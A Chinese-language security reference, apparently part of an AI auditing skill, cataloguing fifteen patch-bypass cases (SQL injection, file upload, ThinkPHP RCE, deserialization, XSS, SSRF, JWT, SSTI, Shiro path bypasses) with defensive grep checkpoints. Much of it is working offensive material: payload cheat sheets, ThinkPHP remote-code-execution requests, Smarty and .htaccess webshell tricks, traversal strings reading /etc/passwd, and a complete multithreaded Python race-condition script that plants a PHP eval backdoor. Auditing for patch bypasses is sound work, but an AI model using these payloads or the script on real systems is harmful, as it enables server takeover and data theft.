# 补丁绕过案例库 (Patch Bypass Case Library)

> 基于 WooYun 漏洞库、Seebug、CNVD 真实案例提炼的补丁绕过模式词典
> 用途：在 Phase 0D 中为新补丁分析提供自动类比基准
> 对应 SKILL.md: Phase 0D 模式 H — 补丁绕过案例库

---

## 概述

```
┌─────────────────────────────────────────────────────────────────┐
│                  补丁绕过的核心认知模型                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  补丁 = 开发者对漏洞的一种认知                                  │
│  绕过 = 攻击者对补丁的另一种认知                                 │
│                                                                 │
│  补丁失败的三个根本原因:                                        │
│  ①  修复范围不足 → 遗漏同族函数/并行接口                        │
│  ②  修复逻辑缺陷 → 过滤/验证存在边界条件                        │
│  ③  修复上下文错误 → 修了A路径，忽略B路径                        │
│                                                                 │
│  对应 Phase 0D 八种模式:                                        │
│  A-不完整修复  B-过滤器绕过  C-竞争条件                         │
│  D-上下文绕过  E-同族变体    F-相似推荐                          │
│  G-符号执行    H-本案例库                                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 案例索引

| 编号 | 漏洞类型 | 绕过模式 | 目标系统 | 严重度 | 案例来源 |
|------|---------|---------|---------|--------|---------|
| BC-001 | SQL注入过滤绕过 | B | 通用 PHP CMS | High | WooYun统计 |
| BC-002 | 文件上传扩展名绕过 | B | Discuz/PHPCMS | High | WooYun-2015 |
| BC-003 | 认证补丁不完整 | A | ThinkPHP 5.x | Critical | Seebug |
| BC-004 | 竞争条件上传绕过 | C | Finecms | High | WooYun-2014-063369 |
| BC-005 | API版本上下文绕过 | D | 通用REST API | High | WooYun统计 |
| BC-006 | 反序列化同族变体 | E | Java中间件 | Critical | WooYun/CNVD |
| BC-007 | XSS过滤绕过 | B | DedeCMS/Discuz | Medium | WooYun-2016 |
| BC-008 | 路径穿越补丁绕过 | B+E | ECShop/帝国CMS | High | WooYun-2015 |
| BC-009 | 权限检查不完整 | A+D | 通用MVC框架 | High | WooYun统计 |
| BC-010 | SSRF过滤绕过 | B | 国产OA/CMS | High | Seebug统计 |
| BC-011 | 命令注入过滤绕过 | B | 路由器/NAS固件 | Critical | WooYun-2015 |
| BC-012 | 二次注入不在补丁范围 | A | DedeCMS | High | WooYun-2016 |
| BC-013 | JWT伪造绕过升级补丁 | B+E | 通用JWT库 | Critical | CNVD统计 |
| BC-014 | 模板注入过滤绕过 | B | ThinkPHP/Smarty | Critical | Seebug |
| BC-015 | 任意文件读取路径绕过 | B | Java Web框架 | High | WooYun-2015 |

---

## BC-001: SQL注入关键字过滤绕过

**漏洞类型**: SQL注入 | **绕过模式**: B (过滤器绕过) | **严重度**: High

### 背景

大量 PHP CMS 使用黑名单关键字过滤修复 SQL 注入，例如:

```php
// 典型"修复"代码
function safe_str($str) {
    $str = str_replace(['select', 'union', 'insert', 'update', 'delete', 'drop'], '', $str);
    return $str;
}
```

### 绕过技术矩阵

```
┌─────────────────────────────────────────────────────────────────────────┐
│               SQL关键字过滤绕过速查表 (WooYun 27,732案例提炼)            │
├──────────────────┬──────────────────────────────────────────────────────┤
│  绕过技术        │  示例                                                │
├──────────────────┼──────────────────────────────────────────────────────┤
│  大小写混写      │  SeLeCt  UnIoN  INSert                               │
│  双写            │  selselectect  uniunionon  (replace仅替换一次)       │
│  注释插入        │  sel/**/ect  un/**/ion  sel%0aect                    │
│  URL编码         │  %73%65%6c%65%63%74  sel%65ct                        │
│  宽字节           │  sélect (GBK/UTF宽字节)                              │
│  等价替换        │  HAVING替代WHERE  || 替代OR  && 替代AND               │
│  科学计数法      │  1e0union  1.0union  1.union                          │
│  十六进制        │  0x756e696f6e  char(117,110,...)                      │
│  内联注释        │  /*!union*/  /*!50000union*/                          │
└──────────────────┴──────────────────────────────────────────────────────┘
```

### 典型绕过案例

**案例: str_replace 双写绕过**
```
目标代码: str_replace('select','', $input)
输入:     selselectect * from users
处理后:   select * from users  ← 绕过成功

更多变体:
- uniunionon → union
- ununionion → union
- 嵌套深度: ununiunionionion (三层嵌套)
```

**案例: 大小写+注释组合**
```sql
-- 绕过大小写不敏感过滤 + 关键字拆分
1 /*!UnIoN*/ /*!SeLeCt*/ 1,2,3--
1 uNiOn/**/sElEcT/**/1,2,3--
1%0aUnIoN%0aSeLeCt%0a1,2,3--
```

**案例: WooYun DedeCMS SQL绕过** (wooyun-2016-0*)
```
URL参数: id=1 union/**/select/**/1,username,password/**/from/**/dede_admin--
补丁:     过滤了 union select (空格)
绕过:     用/**/ 代替空格
```

### Phase 0D 类比检查点

```bash
# 搜索类似的黑名单过滤函数
grep -rn "str_replace\|preg_replace\|str_ireplace" --include="*.php" . \
  | grep -i "select\|union\|insert\|update\|delete\|drop\|exec\|eval"

# 检查是否只替换一次(双写漏洞)
# 安全做法: 循环替换直到字符串不再改变，或使用参数化查询
```

---

## BC-002: 文件上传扩展名过滤绕过

**漏洞类型**: 文件上传 | **绕过模式**: B (过滤器绕过) | **严重度**: High

### 补丁模式分析

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     常见"补丁"及其绕过                                  │
├─────────────────────────────────────────────────────────────────────────┤
│  补丁类型           │ 绕过方法                                         │
├─────────────────────┼───────────────────────────────────────────────────┤
│  黑名单: php,asp,   │ .phtml .php5 .phar .php7 .php::$DATA             │
│          jsp,exe    │ .PhP .PHP .pHp (大小写)                           │
│                     │ .php. .php  (末尾点/空格, Windows)                │
├─────────────────────┼───────────────────────────────────────────────────┤
│  替换php为空        │ .pphphp → strip → .php (双写)                    │
├─────────────────────┼───────────────────────────────────────────────────┤
│  只检查最后扩展名   │ shell.php.jpg → Apache多后缀解析为PHP             │
├─────────────────────┼───────────────────────────────────────────────────┤
│  白名单+pathinfo    │ shell.php%00.jpg → PHP<5.3.4 空字节截断          │
├─────────────────────┼───────────────────────────────────────────────────┤
│  只过滤扩展名       │ .htaccess → AddType application/x-httpd-php .jpg │
│                     │ .user.ini → auto_prepend_file=shell.jpg          │
└─────────────────────┴───────────────────────────────────────────────────┘
```

### WooYun 真实绕过案例

**案例1: Discuz 上传绕过** (wooyun-2015-0108457)
```
官方补丁: 增加扩展名黑名单
绕过:     服务端返回允许类型列表，拦截响应修改后再上传
关键点:   补丁只限制了上传，未限制服务端返回的配置信息
绕过步骤:
  1. 拦截上传接口的 HTTP 响应
  2. 修改 allowedTypes 字段，添加 php
  3. 重放请求上传 .php 文件
```

**案例2: PHPCMS 上传绕过** (wooyun-2015-0149146)
```
官方补丁: 黑名单包含 .php .asp .jsp
绕过:     上传 .jspx 文件 (Tomcat支持，黑名单未包含)
扩展绕过: JSP变体扩展名: .jspx .jsw .jsv .jspf
PHP变体:  .php3 .php4 .php5 .php7 .phtml .phar .phps .pht
ASP变体:  .asa .cer .cdx .htr .asp;.jpg (IIS分号截断)
```

**案例3: ECShop 配置文件绕过**
```
官方补丁: 限制上传目录的 .php 文件
绕过:     上传 .htaccess 文件 (黑名单未包含)
.htaccess内容:
  <FilesMatch "\.(jpg|gif|png)$">
    SetHandler application/x-httpd-php
  </FilesMatch>
配合:     随后上传图片马即可执行
```

### Phase 0D 类比检查点

```bash
# 检查文件类型验证函数
grep -rn "pathinfo\|explode.*\.\|strtolower.*ext\|PATHINFO_EXTENSION" \
     --include="*.php" . | grep -v vendor

# 检查是否允许上传配置文件
grep -rn "\.htaccess\|\.user\.ini\|web\.config" --include="*.php" .

# 确认黑名单是否包含所有变体
grep -rn "blacklist\|black_list\|forbidden\|deny_ext" --include="*.php" .
```

---

## BC-003: ThinkPHP 认证绕过补丁不完整

**漏洞类型**: 认证绕过/RCE | **绕过模式**: A (修复不完整) | **严重度**: Critical

### 背景 (ThinkPHP 5.x RCE系列)

ThinkPHP 5.x 系列存在多个 RCE 漏洞，每次补丁均因修复不完整而被绕过。

```
版本演进与绕过链:
┌──────────────────────────────────────────────────────────────────────┐
│  5.0.22 → 修补 method 参数注入                                        │
│         → 绕过: _method=__construct 仍可注入                          │
│                                                                      │
│  5.0.23 → 修补 __construct 绕过                                       │
│         → 绕过: 通过 filter 参数调用任意函数                           │
│                                                                      │
│  5.1.x  → 修补 filter 注入                                            │
│         → 绕过: 路由参数另一路径仍可控                                 │
└──────────────────────────────────────────────────────────────────────┘
```

### 典型Payload演进

```
# 第一代 PoC (修复前)
POST /index.php?s=captcha HTTP/1.1
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

# 第一代补丁: 过滤了 _method=__construct

# 绕过第一代补丁
POST /index.php?s=index/\think\app/invokefunction&function=call_user_func_array
&vars[0]=system&vars[1][]=id

# 第二代补丁: 限制了 invokefunction 路由

# 绕过第二代补丁 (5.1.x)
GET /?s=index/\think\Request/input&filter=system&data=id
GET /?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php..>
```

### 模式总结: A类不完整修复的识别方法

```
┌─────────────────────────────────────────────────────────────────────────┐
│                   A类绕过的系统性搜索框架                                │
├─────────────────────────────────────────────────────────────────────────┤
│  问题: 官方只修了漏洞的「入口点1」，但同类操作有多个入口                 │
│                                                                         │
│  搜索策略:                                                              │
│  1. 找到漏洞的「危险操作」(sink): eval/system/file_put_contents 等      │
│  2. 搜索所有调用该危险操作的函数                                        │
│  3. 检查每个调用点是否经过相同的补丁保护                                 │
│  4. 逐一验证未受保护的调用路径                                          │
│                                                                         │
│  典型遗漏位置:                                                          │
│  ├── 批量操作接口 (官方修了单个接口)                                     │
│  ├── API版本 (官方修了v1, v2存在同样问题)                               │
│  ├── 插件/扩展 (官方修了核心，插件未修)                                  │
│  ├── AJAX接口 (官方修了普通接口，AJAX未修)                              │
│  ├── 移动端API (官方修了Web端，移动端未修)                              │
│  └── 管理后台 (官方修了前台，后台未修)                                   │
└─────────────────────────────────────────────────────────────────────────┘
```

### Phase 0D 类比检查点

```bash
# ThinkPHP 类框架: 检查所有路由可达的方法
grep -rn "invokefunction\|call_user_func\|invoke\b" \
     --include="*.php" . | grep -v vendor | grep -v test

# 检查补丁是否覆盖了所有执行入口
grep -rn "__construct\|filter\b\|request.*method" \
     --include="*.php" . | grep -v vendor
```

---

## BC-004: 竞争条件上传绕过

**漏洞类型**: 文件上传 | **绕过模式**: C (竞争条件) | **严重度**: High
**来源**: wooyun-2014-063369 (Finecms)

### 漏洞原理

```
「补丁」逻辑:
上传文件 → 移动到临时目录 → 检查文件内容 → 不合格则删除
             ↑                                    ↑
           t=0                                  t=N

问题: t=0 到 t=N 之间存在时间窗口
      攻击者在窗口期内访问临时文件即可执行
```

### WooYun 案例: Finecms 竞争条件

```
目标: /member/controllers/Account.php 上传头像功能
流程:
  1. 上传 shell.php
  2. 服务器移动到 /uploads/tmp/shell.php
  3. 检查文件扩展名 → 发现 .php → 触发删除
  4. 但步骤2和步骤3之间存在时间差

利用方法:
  多线程同时执行:
  - 线程1: 持续上传 shell.php
  - 线程2: 持续访问 /uploads/tmp/shell.php

关键技巧: shell.php 内容生成新的持久文件
  <?php file_put_contents('../backdoor.php', '<?php eval($_POST["x"]); ?>'); ?>
  利用瞬间执行生成不会被删除的 backdoor.php
```

### 竞争条件利用脚本

```python
import threading
import requests
import time

TARGET = "http://target.com"
UPLOAD_URL = f"{TARGET}/member/upload"
SHELL_URL = f"{TARGET}/uploads/tmp/shell.php"

stop_event = threading.Event()

def upload_thread():
    shell_content = b"<?php file_put_contents('../bd.php','<?php eval($_POST[x]);?>'); ?>"
    while not stop_event.is_set():
        try:
            files = {'avatar': ('shell.php', shell_content, 'image/jpeg')}
            requests.post(UPLOAD_URL, files=files, timeout=3)
        except:
            pass

def access_thread():
    while not stop_event.is_set():
        try:
            r = requests.get(SHELL_URL, timeout=1)
            if r.status_code == 200:
                print(f"[+] 文件存在，尝试触发执行!")
        except:
            pass

def check_backdoor():
    bd_url = f"{TARGET}/uploads/bd.php"
    while not stop_event.is_set():
        try:
            r = requests.post(bd_url, data={'x': 'echo PWNED;'}, timeout=2)
            if 'PWNED' in r.text:
                print(f"[+] 后门创建成功: {bd_url}")
                stop_event.set()
        except:
            pass
        time.sleep(0.5)

threads = [
    threading.Thread(target=upload_thread),
    threading.Thread(target=upload_thread),
    threading.Thread(target=access_thread),
    threading.Thread(target=access_thread),
    threading.Thread(target=check_backdoor),
]
for t in threads:
    t.start()
for t in threads:
    t.join(timeout=30)
```

### Phase 0D 类比检查点

```bash
# 搜索上传+检查+删除的代码流
grep -rn "unlink\|move_uploaded_file\|rename\|copy" \
     --include="*.php" . | grep -v vendor

# Java 竞争条件
grep -rn "Files.delete\|File.delete\|transferTo\|MultipartFile" \
     --include="*.java" . | grep -v test
```

---

## BC-005: API版本上下文绕过

**漏洞类型**: 认证绕过 | **绕过模式**: D (上下文绕过) | **严重度**: High

### 模式描述

官方修复了 `/api/v1/` 的漏洞，但 `/api/v2/`、`/api/beta/`、`/mobile/api/` 或旧版接口存在相同问题。

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     API版本绕过的常见场景                                │
├────────────────────┬────────────────────────────────────────────────────┤
│  场景              │  说明                                              │
├────────────────────┼────────────────────────────────────────────────────┤
│  多版本并存        │ /api/v1/ 修复了，/api/v2/ 同样存在                 │
│  移动端独立        │ Web端修复了，/app/api/ 未修                        │
│  内部API           │ 外部API修复了，/internal/ 或 /admin/api/ 未修      │
│  旧版保留          │ 官方已知旧版本有漏洞但保留兼容性未修               │
│  第三方集成        │ 官方修复了，集成的第三方SDK仍然有漏洞              │
│  微服务独立        │ 网关层修复了，内部微服务直连时无该保护             │
└────────────────────┴────────────────────────────────────────────────────┘
```

### 验证示例

```
# 修复后的接口 (401)
GET /api/v1/user/list  → 401 Unauthorized

# 被遗漏的接口 (200)
GET /api/v2/user/list  → 200 {users: [...]}
GET /mobile/user/list  → 200 {users: [...]}
```

### Phase 0D 类比检查点

```bash
# Java Spring Boot
grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" \
     --include="*.java" . | grep -i "v1\|v2\|mobile\|api"

# 检查认证中间件是否一致应用于所有版本
grep -rn "AuthMiddleware\|authCheck\|requireAuth\|@PreAuthorize" \
     --include="*.java" --include="*.php" .
```

---

## BC-006: Java 反序列化 Gadget 链同族变体

**漏洞类型**: 反序列化RCE | **绕过模式**: E (同族变体) | **严重度**: Critical

### Gadget 链家族速查

```
┌──────────────────────────────────┬──────────────────────────────────────┐
│  Commons Collections 1 (CC1)     │  基于 InvokerTransformer              │
│  Commons Collections 2 (CC2)     │  基于 PriorityQueue + CC4.0           │
│  Commons Collections 3 (CC3)     │  TemplatesImpl 加载字节码              │
│  Commons Collections 4 (CC4)     │  CC2的变体, 不需要 InvokerTransformer  │
│  Commons Collections 5 (CC5)     │  绕过 CC1 的过滤                       │
│  Commons Collections 6 (CC6)     │  不依赖 Java 版本                      │
│  Commons Collections 7 (CC7)     │  基于 Hashtable                        │
├──────────────────────────────────┼──────────────────────────────────────┤
│  Spring1 / Spring2               │  Spring框架 Gadget链                   │
│  Hibernate1 / Hibernate2         │  Hibernate框架 Gadget链                │
│  Groovy1                         │  Groovy Gadget链                       │
│  URLDNS                          │  DNS探测（无回显检测用）                │
└──────────────────────────────────┴──────────────────────────────────────┘
```

### 典型绕过场景

**黑名单过滤绕过**
```java
// 官方补丁: 黑名单过滤 CommonsCollections
// CheckedObjectInputStream 禁止: org.apache.commons.collections.*

// 绕过: 使用未被黑名单覆盖的Gadget链
// 如: Spring1, Groovy1, Hibernate1
// 或使用 CC6 (不使用被过滤的类)
// 进一步: 若 TemplatesImpl 未被过滤，可通过字节码注入绕过
```

### Phase 0D 类比检查点

```bash
# Java: 搜索所有反序列化入口
grep -rn "ObjectInputStream\|readObject\|readResolve\|readExternal" \
     --include="*.java" . | grep -v test

# 检查黑名单是否完整
grep -rn "blacklist\|deny.*list\|filterCheck\|SerialKiller" \
     --include="*.java" . | grep -v test

# FastJson 变体检测
grep -rn "JSON.parseObject\|JSON.parse\|FastJsonHttpMessageConverter" \
     --include="*.java" . | grep -v test
```

---

## BC-007: XSS 过滤绕过

**漏洞类型**: XSS | **绕过模式**: B (过滤器绕过) | **严重度**: Medium

### 绕过速查表 (WooYun 7,532案例提炼)

```
┌──────────────────────────┬──────────────────────────────────────────────┤
│  绕过类型                │  Payload                                    │
├──────────────────────────┼──────────────────────────────────────────────┤
│  标签大小写              │  <ScRiPt>alert(1)</ScRiPt>                  │
│  标签变形                │  <script/x>  <script\n>  <script\t>         │
│  属性注入                │  <img src=x onerror=alert(1)>               │
│  HTML5标签               │  <video src=x onerror=alert(1)>             │
│                          │  <details open ontoggle=alert(1)>           │
│  编码绕过                │  &#x61;&#x6c;&#x65;&#x72;&#x74;            │
│  协议绕过                │  data:text/html,<script>alert(1)</script>   │
│  嵌套绕过                │  <scr<script>ipt>alert(1)</scr</script>ipt> │
│  空字符                  │  java\0script:alert(1)                      │
│  换行分割                │  java\nscript:alert(1)                      │
└──────────────────────────┴──────────────────────────────────────────────┘
```

### Phase 0D 类比检查点

```bash
# 检查输出过滤
grep -rn "htmlspecialchars\|htmlentities\|strip_tags\|addslashes" \
     --include="*.php" . | grep -v vendor

# 搜索可能的 DOM XSS
grep -rn "innerHTML\|outerHTML\|document.write\|eval\|setTimeout" \
     --include="*.js" . | grep -v vendor | grep -v ".min.js"
```

---

## BC-008: 路径穿越补丁绕过

**漏洞类型**: 任意文件读/写 | **绕过模式**: B+E | **严重度**: High

### 绕过技术矩阵

```
┌────────────────────────┬──────────────────────────────────────────────┐
│  补丁方式              │  绕过Payload                                 │
├────────────────────────┼──────────────────────────────────────────────┤
│  过滤 ../              │  ..././  (replace后仍剩 ../)                 │
│                        │  .../  (三个点)  ....//                      │
│                        │  ..%2f  ..%252f (双重编码)                   │
│                        │  ..%c0%af (Unicode斜杠 UTF-8异常)            │
│                        │  ..\  (Windows反斜杠)  ..%5c                 │
├────────────────────────┼──────────────────────────────────────────────┤
│  realpath() 检查       │  软链接绑定                                  │
│                        │  Linux /proc/self/fd/* 路径                  │
├────────────────────────┼──────────────────────────────────────────────┤
│  前缀检查              │  /allowed/../../etc/passwd                   │
└────────────────────────┴──────────────────────────────────────────────┘
```

### 典型案例: ECShop 文件读取绕过

```
官方补丁: 过滤 ../ 字符串
绕过:    ..././ → 替换 ../ 后剩 ../
步骤:
  1. 参数输入: file=..././..././..././etc/passwd
  2. str_replace('../', '', $file) 执行后: file=../../etc/passwd
  3. 实际读取: /var/www/html/../../etc/passwd → /etc/passwd
```

### Phase 0D 类比检查点

```bash
# PHP 路径处理
grep -rn "file_get_contents\|readfile\|include\|require\|fopen" \
     --include="*.php" . | grep -v vendor \
  | grep "\$_GET\|\$_POST\|\$_REQUEST\|\$param\|\$file\|\$path"

# Java ZIP解压穿越
grep -rn "ZipInputStream\|ZipEntry\|ZipFile\|unzip\|extractZip" \
     --include="*.java" . | grep -v test
```

---

## BC-009: 权限检查不完整

**漏洞类型**: 越权/未授权 | **绕过模式**: A+D | **严重度**: High

### 高频遗漏场景 (WooYun 14,377案例提炼)

```
┌───────────────────────────────────┬─────────────────────────────────────┐
│  遗漏位置                         │  频率                               │
├───────────────────────────────────┼─────────────────────────────────────┤
│  批量操作接口                     │ 高频 (修了单个，漏了批量)            │
│  导出/下载接口                    │ 高频 (读接口加了权限，导出未加)      │
│  移动端API                        │ 高频 (Web端加了，App API未加)        │
│  IDOR (直接对象引用)               │ 极高 (只验证登录，不验证所属)        │
│  HTTP方法绕过                     │ 中频 (GET有检查，POST/PUT无检查)     │
└───────────────────────────────────┴─────────────────────────────────────┘
```

### Phase 0D 类比检查点

```bash
# Java Spring: 检查 @PreAuthorize 注解覆盖情况
grep -rn "@RequestMapping\|@GetMapping\|@PostMapping\|@DeleteMapping" \
     --include="*.java" . | xargs -I{} grep -L "@PreAuthorize\|@Secured" {}
```

---

## BC-010: SSRF 过滤绕过

**漏洞类型**: SSRF | **绕过模式**: B | **严重度**: High

### 绕过速查表

```
┌───────────────────────────────────────────┬─────────────────────────────┐
│  绕过技术                                 │  示例                       │
├───────────────────────────────────────────┼─────────────────────────────┤
│  IP进制转换                               │  http://2130706433/         │
│  (127.0.0.1 十进制)                       │  http://0177.0.0.1/ (八进制)│
│                                           │  http://0x7f.0.0.1/ (十六)  │
│                                           │  http://127.1/              │
├───────────────────────────────────────────┼─────────────────────────────┤
│  DNS 重绑定                               │  第一次解析合法IP            │
│                                           │  第二次解析 127.0.0.1       │
├───────────────────────────────────────────┼─────────────────────────────┤
│  URL解析差异                              │  http://evil.com@127.0.0.1/ │
│                                           │  http://127.0.0.1#evil.com  │
├───────────────────────────────────────────┼─────────────────────────────┤
│  协议绕过                                 │  dict://  gopher://  file:// │
├───────────────────────────────────────────┼─────────────────────────────┤
│  重定向绕过                               │  302跳转到127.0.0.1          │
│                                           │  过滤检查URL但不跟踪重定向   │
└───────────────────────────────────────────┴─────────────────────────────┘
```

### Phase 0D 类比检查点

```bash
# PHP
grep -rn "curl_exec\|file_get_contents\|fsockopen\|stream_socket_client" \
     --include="*.php" . | grep -v vendor

# Java
grep -rn "URL.*openConnection\|HttpClient\|RestTemplate\|WebClient\|OkHttp" \
     --include="*.java" . | grep -v test
```

---

## BC-011: 命令注入过滤绕过

**漏洞类型**: 命令注入 | **绕过模式**: B | **严重度**: Critical

### 绕过速查表

```
┌─────────────────────────────────────────────────────────────────────────┐
│  绕过符号             │  示例                                           │
├───────────────────────┼─────────────────────────────────────────────────┤
│  换行符 (\n)          │  cmd1%0acmd2                                   │
│  回车符 (\r)          │  cmd1%0dcmd2                                   │
│  ${IFS}              │  ls${IFS}/etc                                   │
│  $IFS$9              │  ls$IFS$9/etc                                   │
│  {,}括号              │  {ls,/etc}                                     │
│  关键字拆分           │  ca\t /etc/passwd  c'a't /etc  c""at /etc      │
│  glob 通配符           │  /???/??t /etc/passwd                          │
│  十六进制执行          │  echo "6964" | xxd -r -p | bash                │
└───────────────────────┴─────────────────────────────────────────────────┘
```

### Phase 0D 类比检查点

```bash
# PHP
grep -rn "system\b\|exec\b\|passthru\|shell_exec\|popen\|proc_open" \
     --include="*.php" . | grep -v vendor

# Python
grep -rn "os\.system\|subprocess\|os\.popen\|commands\." \
     --include="*.py" . | grep -v test
```

---

## BC-012: 二次注入不在补丁范围

**漏洞类型**: SQL注入 | **绕过模式**: A (修复不完整) | **严重度**: High

### 二次注入原理

```
┌─────────────────────────────────────────────────────────────────────────┐
│  阶段1: 存储                                                            │
│  用户输入 → addslashes → 入库 (数据库中带反斜杠)                         │
│  例: username = "admin\'--"  存入: "admin\'--"                          │
│                                                                         │
│  阶段2: 取出                                                            │
│  从数据库取出 → stripslashes → 变为 "admin'--" (反斜杠消失)              │
│                                                                         │
│  阶段3: 二次使用                                                        │
│  将取出的值拼接到新的SQL → SQL注入成功                                  │
│                                                                         │
│  补丁陷阱: 开发者修复了「输入处」的注入                                  │
│           但忽略了「存储+取出+再使用」的二次注入链                        │
└─────────────────────────────────────────────────────────────────────────┘
```

### Phase 0D 类比检查点

```bash
# 搜索从数据库取值后再用于SQL的模式
grep -rn "getOne\|fetchOne\|fetch\|query_row" \
     --include="*.php" . | grep -v vendor

# 参考 references/core/second_order_taint.md
```

---

## BC-013: JWT 算法混淆绕过

**漏洞类型**: 认证绕过 | **绕过模式**: B+E | **严重度**: Critical

### 补丁演进与绕过

```
┌─────────────────────────────────────────────────────────────────────────┐
│  攻击1: none算法 (alg=none)                                             │
│  补丁:  拒绝 alg=none                                                   │
│  绕过:  alg=None / alg=NONE / alg=nOnE (大小写)                        │
├─────────────────────────────────────────────────────────────────────────┤
│  攻击2: HS256/RS256算法混淆                                             │
│  原理:  服务器用RSA公钥验证，攻击者用公钥作为HMAC密钥签名               │
│  绕过:  升级库但未重新配置，或使用了未升级的副本                         │
├─────────────────────────────────────────────────────────────────────────┤
│  攻击3: kid 注入                                                        │
│  绕过:  kid=../../dev/null → 空密钥 → HMAC("")可伪造                    │
├─────────────────────────────────────────────────────────────────────────┤
│  攻击4: jku/x5u URL注入                                                 │
│  补丁:  添加 jku 域名白名单                                              │
│  绕过:  https://allowed.com@evil.com/key.json                           │
└─────────────────────────────────────────────────────────────────────────┘
```

### Phase 0D 类比检查点

```bash
# Java JWT库
grep -rn "JwtParser\|JWTs\|Jwts\|JWTVerifier\|JWT.decode" \
     --include="*.java" . | grep -v test

# PHP
grep -rn "JWT::decode\|firebase.php-jwt\|jwt_decode" \
     --include="*.php" . | grep -v vendor
```

---

## BC-014: 模板注入过滤绕过

**漏洞类型**: SSTI | **绕过模式**: B | **严重度**: Critical

### 绕过技术

```
Python (Jinja2):
  # 绕过 [] 过滤
  {{ request|attr('__class__') }}
  {{ request|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') }}

PHP (Smarty):
  # 绕过 {$ 过滤
  {if system('id')}{/if}
  {if phpinfo()}{/if}
  {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Phase 0D 类比检查点

```bash
# PHP Smarty/Twig
grep -rn "Smarty\|smarty\|twig\|blade" --include="*.php" . | grep -v vendor

# Python Flask/Jinja2
grep -rn "render_template_string\|Environment\|from_string" \
     --include="*.py" . | grep -v test
```

---

## BC-015: Java 任意文件读取路径绕过

**漏洞类型**: 文件读取 | **绕过模式**: B | **严重度**: High

### Shiro 认证绕过路径演进 (CVE系列)

```
CVE-2016-4437 → remember me反序列化
CVE-2019-12422 → 路径匹配绕过
CVE-2020-1957  → /..;/ 绕过
CVE-2020-11989 → /;/ 绕过
CVE-2020-13933 → /%2f 绕过
CVE-2021-41303 → 新变体持续出现

绕过Payload:
  /..;/admin
  /;/admin
  /%2e%2e/admin
  /admin/%20
  /\admin
```

### 路径绕过速查

```
┌────────────────────┬───────────────────────────────────────────────────┐
│  绕过类型          │  Payload                                          │
├────────────────────┼───────────────────────────────────────────────────┤
│  URL双重编码       │  %252e%252e%252f                                  │
│  Unicode编码       │  ..%c0%af  ..%c1%9c                              │
│  路径规范化绕过    │  /./  //  /upload/../                             │
│  Windows反斜杠     │  ..\etc\passwd  ..\\..\\ (Windows路径)           │
└────────────────────┴───────────────────────────────────────────────────┘
```

### Phase 0D 类比检查点

```bash
# Java 文件操作
grep -rn "new File\|Paths.get\|FileInputStream\|FileUtils.readFileToString" \
     --include="*.java" . | grep -v test

# 检查是否使用了安全的路径规范化
grep -rn "normalize\|toRealPath\|getCanonicalPath\|realpath" \
     --include="*.java" . | grep -v test
```

---

## 补丁绕过快速决策树

```
发现目标系统有历史漏洞或补丁记录
             │
      ┌──────▼──────┐
      │ 查看补丁内容  │
      └──────┬──────┘
             │
    ┌─────────┴─────────┐
    │                   │
    ▼                   ▼
 修复了什么?          修了哪个接口?
    │                   │
    ├─ 过滤函数 ───→ 模式B: 过滤器绕过
    ├─ 某个函数 ───→ 模式A+E: 不完整修复+同族变体
    ├─ 权限检查 ───→ 模式A+D: 不完整修复+上下文绕过
    ├─ 时序逻辑 ───→ 模式C: 竞争条件
    └─ 某个API  ───→ 模式D: 上下文绕过 (其他API?)
```

---

## 与其他模块的关联

| 关联模块 | 补充内容 |
|---------|---------|
| `references/core/bypass_strategies.md` | 通用绕过思维框架，本文提供具体案例 |
| `references/core/taint_analysis.md` | 污点追踪用于定位补丁遗漏的路径 |
| `references/core/poc_generation.md` | 绕过 PoC 的生成模板 |
| `references/wooyun/sql-injection.md` | SQL注入绕过向量扩展 |
| `references/wooyun/file-upload.md` | 文件上传绕过详细案例 |
| `references/languages/java_deserialization.md` | Java反序列化Gadget链详情 |
| `references/security/authentication_authorization.md` | 认证/授权绕过方法论 |

---

`★ 核心洞察: 补丁绕过的本质是「认知差」——补丁修复的是开发者已知的攻击面，绕过发现的是开发者未知的攻击面`

---

*数据来源: WooYun漏洞库 88,636 案例 + Seebug + CNVD*
*文档版本: v1.0 (2026-03-04)*
*对应 SKILL.md Phase 0D 模式 H*